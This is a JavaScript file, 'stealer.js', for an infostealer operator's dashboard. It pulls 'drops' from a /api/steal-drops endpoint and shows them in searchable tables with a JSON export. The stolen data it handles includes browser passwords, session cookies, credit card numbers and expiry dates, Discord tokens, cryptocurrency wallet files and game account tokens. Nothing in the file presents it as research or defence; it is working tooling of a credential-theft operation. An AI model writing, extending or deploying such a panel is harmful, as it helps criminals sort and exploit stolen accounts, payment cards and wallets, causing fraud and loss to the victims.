/** stealer.js — standalone stealer drops viewer */

let allDrops = [];
let searchTerm = "";

const dropList = document.getElementById("drop-list");
const emptyState = document.getElementById("empty-state");
const dropCount = document.getElementById("drop-count");
const searchInput = document.getElementById("search-input");
const refreshBtn = document.getElementById("refresh-btn");
const exportBtn = document.getElementById("export-btn");

async function fetchDrops() {
  try {
    const res = await fetch("/api/steal-drops");
    if (!res.ok) throw new Error(res.statusText);
    allDrops = await res.json();
    render();
  } catch (e) {
    console.error("Failed to fetch stealer drops", e);
  }
}

function matches(drop) {
  if (!searchTerm) return true;
  const q = searchTerm.toLowerCase();
  for (const c of drop.credentials || []) {
    if (c.url?.toLowerCase().includes(q)) return true;
    if (c.username?.toLowerCase().includes(q)) return true;
    if (c.browser?.toLowerCase().includes(q)) return true;
  }
  for (const c of drop.cookies || []) {
    if (c.host?.toLowerCase().includes(q)) return true;
    if (c.name?.toLowerCase().includes(q)) return true;
    if (c.browser?.toLowerCase().includes(q)) return true;
  }
  for (const c of drop.cards || []) {
    if (c.name?.toLowerCase().includes(q)) return true;
    if (c.number?.includes(q)) return true;
  }
  for (const t of drop.tokens || []) {
    if (t.toLowerCase().includes(q)) return true;
  }
  for (const w of drop.wallets || []) {
    if (w.wallet?.toLowerCase().includes(q)) return true;
    if (w.filename?.toLowerCase().includes(q)) return true;
  }
  for (const g of drop.gameTokens || []) {
    if (g.game?.toLowerCase().includes(q)) return true;
    if (g.username?.toLowerCase().includes(q)) return true;
  }
  return false;
}

function escHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function renderTable(headers, rows, colClasses) {
  if (!rows.length) return "";
  return `<div class="overflow-x-auto">
    <table class="w-full text-xs border-collapse">
      <thead><tr class="text-slate-500 border-b border-slate-700">
        ${headers.map(h => `<th class="text-left py-1 pr-3 font-medium">${h}</th>`).join("")}
      </tr></thead>
      <tbody class="font-mono">
        ${rows.map(row => `<tr class="border-b border-slate-800/50 hover:bg-slate-800/30">
          ${row.map((cell, i) => `<td class="py-1 pr-3 ${colClasses[i] || "text-slate-300"} max-w-xs truncate" title="${escHtml(cell)}">${escHtml(cell)}</td>`).join("")}
        </tr>`).join("")}
      </tbody>
    </table>
  </div>`;
}

function renderDrop(drop, idx) {
  const date = new Date(drop.ts).toLocaleString();
  const credCount       = (drop.credentials || []).length;
  const cookieCount     = (drop.cookies     || []).length;
  const cardCount       = (drop.cards       || []).length;
  const tokenCount      = (drop.tokens      || []).length;
  const walletCount     = (drop.wallets     || []).length;
  const gameTokenCount  = (drop.gameTokens  || []).length;

  let credsHtml = "";
  if (credCount > 0) {
    credsHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-solid fa-lock text-violet-400"></i> Passwords (${credCount})
      </div>
      ${renderTable(
        ["Browser","Profile","URL","Username","Password"],
        drop.credentials.map(c => [c.browser, c.profile, c.url, c.username, c.password]),
        ["text-cyan-300","text-slate-400","text-blue-300","text-green-300","text-yellow-200"]
      )}</div>`;
  }

  let cookiesHtml = "";
  if (cookieCount > 0) {
    cookiesHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-solid fa-cookie text-blue-400"></i> Cookies (${cookieCount})
      </div>
      ${renderTable(
        ["Browser","Profile","Host","Name","Value","Path"],
        drop.cookies.map(c => [c.browser, c.profile, c.host, c.name, c.value, c.path]),
        ["text-cyan-300","text-slate-400","text-blue-300","text-green-300","text-slate-300","text-slate-500"]
      )}</div>`;
  }

  let cardsHtml = "";
  if (cardCount > 0) {
    cardsHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-solid fa-credit-card text-yellow-400"></i> Credit Cards (${cardCount})
      </div>
      ${renderTable(
        ["Browser","Profile","Name","Number","Expiry"],
        drop.cards.map(c => [c.browser, c.profile, c.name, c.number, `${c.expiryMonth}/${c.expiryYear}`]),
        ["text-cyan-300","text-slate-400","text-slate-300","text-yellow-200","text-slate-400"]
      )}</div>`;
  }

  let tokensHtml = "";
  if (tokenCount > 0) {
    tokensHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-brands fa-discord text-indigo-400"></i> Discord Tokens (${tokenCount})
      </div>
      <div class="flex flex-col gap-1">
        ${drop.tokens.map(t => `<div class="font-mono text-xs text-indigo-200 bg-slate-800/60 rounded px-2 py-1 break-all">${escHtml(t)}</div>`).join("")}
      </div></div>`;
  }

  let walletsHtml = "";
  if (walletCount > 0) {
    walletsHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-solid fa-wallet text-orange-400"></i> Wallet Files (${walletCount})
      </div>
      ${renderTable(
        ["Wallet","File","Size","Data (base64 preview)"],
        drop.wallets.map(w => [w.wallet, w.filename, `${Math.round((w.dataB64?.length||0)*0.75)} B`, (w.dataB64||"").slice(0,48)+"…"]),
        ["text-orange-300","text-slate-300","text-slate-500","text-slate-400"]
      )}</div>`;
  }

  let gameTokensHtml = "";
  if (gameTokenCount > 0) {
    gameTokensHtml = `<div class="mt-3">
      <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
        <i class="fa-solid fa-gamepad text-emerald-400"></i> Game Tokens (${gameTokenCount})
      </div>
      ${renderTable(
        ["Game","Type","Username","Token"],
        drop.gameTokens.map(g => [g.game, g.type, g.username, g.value]),
        ["text-emerald-300","text-slate-400","text-cyan-300","text-slate-200"]
      )}</div>`;
  }

  let errorsHtml = "";
  if (drop.errors?.length > 0) {
    errorsHtml = `<div class="mt-2">
      <div class="text-xs font-semibold text-slate-500 mb-1 uppercase tracking-wide">Errors</div>
      <div class="text-xs font-mono text-red-400/70 space-y-0.5">
        ${drop.errors.map(e => `<div>${escHtml(e)}</div>`).join("")}
      </div></div>`;
  }

  return `
    <div class="drop-card bg-slate-900/70 border border-slate-800 rounded-lg p-4 transition-colors">
      <div class="flex items-center justify-between gap-2 flex-wrap">
        <div class="flex items-center gap-2 text-sm">
          <i class="fa-solid fa-circle-dot text-violet-400"></i>
          <span class="text-slate-200 font-semibold">Drop #${idx + 1}</span>
          <span class="text-slate-500">${escHtml(date)}</span>
        </div>
        <div class="flex flex-wrap gap-2 text-xs">
          ${credCount   ? `<span class="px-2 py-0.5 bg-violet-900/40 border border-violet-700/40 text-violet-300 rounded-full">${credCount} pw</span>`   : ""}
          ${cookieCount ? `<span class="px-2 py-0.5 bg-blue-900/40 border border-blue-700/40 text-blue-300 rounded-full">${cookieCount} cookies</span>` : ""}
          ${cardCount   ? `<span class="px-2 py-0.5 bg-yellow-900/40 border border-yellow-700/40 text-yellow-300 rounded-full">${cardCount} cards</span>` : ""}
          ${tokenCount  ? `<span class="px-2 py-0.5 bg-indigo-900/40 border border-indigo-700/40 text-indigo-300 rounded-full">${tokenCount} tokens</span>` : ""}
          ${walletCount     ? `<span class="px-2 py-0.5 bg-orange-900/40 border border-orange-700/40 text-orange-300 rounded-full">${walletCount} wallet files</span>` : ""}
          ${gameTokenCount  ? `<span class="px-2 py-0.5 bg-emerald-900/40 border border-emerald-700/40 text-emerald-300 rounded-full">${gameTokenCount} game tokens</span>` : ""}
        </div>
      </div>
      ${credsHtml}${cookiesHtml}${cardsHtml}${tokensHtml}${walletsHtml}${gameTokensHtml}${errorsHtml}
    </div>`;
}

function render() {
  const filtered = allDrops.filter(matches);
  dropCount.innerHTML = `<i class="fa-solid fa-key"></i> ${filtered.length} drop${filtered.length !== 1 ? "s" : ""}`;

  if (filtered.length === 0) {
    dropList.innerHTML = "";
    emptyState.classList.remove("hidden");
    return;
  }
  emptyState.classList.add("hidden");
  dropList.innerHTML = filtered.map((d, i) => renderDrop(d, allDrops.indexOf(d))).join("");
}

searchInput.addEventListener("input", () => {
  searchTerm = searchInput.value.trim();
  render();
});

refreshBtn.addEventListener("click", fetchDrops);

exportBtn.addEventListener("click", () => {
  const blob = new Blob([JSON.stringify(allDrops, null, 2)], { type: "application/json" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `stealer-drops-${Date.now()}.json`;
  a.click();
});

// Initial load
fetchDrops();
